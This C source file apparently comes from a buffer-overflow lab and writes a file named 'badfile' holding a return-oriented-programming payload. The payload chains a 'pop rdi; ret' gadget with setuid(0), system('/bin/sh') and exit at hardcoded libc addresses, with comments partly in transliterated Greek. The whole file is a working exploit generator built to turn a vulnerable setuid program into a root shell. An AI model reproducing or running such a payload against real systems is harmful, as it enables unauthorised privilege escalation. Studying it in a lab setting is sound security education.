#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int main(int argc, char **argv){
    char buf[80];                   // gia na xwraei mexri na doyme ti paizei
    FILE *badfile;
    badfile = fopen("./badfile", "w");

    *(long *) &buf[0] = *(long *)"\x00\x00\x00\x00\x00\x00\x00\x00";  // junk
    *(long *) &buf[8] = *(long *)"\x41\x41\x41\x41\x41\x41\x41\x41";  // junk
    *(long *) &buf[16] = *(long *)"\x41\x41\x41\x41\x41\x41\x41\x41"; // junk
    *(long *) &buf[24] = *(long *)"\xe3\x06\x40\x00\x00\x00\x00\x00"; // rop gadget "pop rdi; ret;"
    *(long *) &buf[32] = 0;                                           // the integer "0" as the parameter for "setuid" syscall
    *(long *) &buf[40] = *(long *)"\x00\xa7\xad\xf7\xff\x7f\x00\x00"; // the address of the "setuid" syscall
    *(long *) &buf[48] = *(long *)"\xe3\x06\x40\x00\x00\x00\x00\x00"; // rop gadget "pop rdi; ret;"
    *(long *) &buf[56] = *(long *)"\x77\xa1\xb9\xf7\xff\x7f\x00\x00"; // address of the string "/bin/sh"
    *(long *) &buf[64] = *(long *)"\x90\x33\xa5\xf7\xff\x7f\x00\x00"; // address of the "system" syscall
    *(long *) &buf[72] = *(long *)"\x30\x80\xa4\xf7\xff\x7f\x00\x00";// address of the "exit" syscall
    
    
    fwrite(buf, sizeof(buf), 1, badfile);
    fclose(badfile);

    return 0;
}


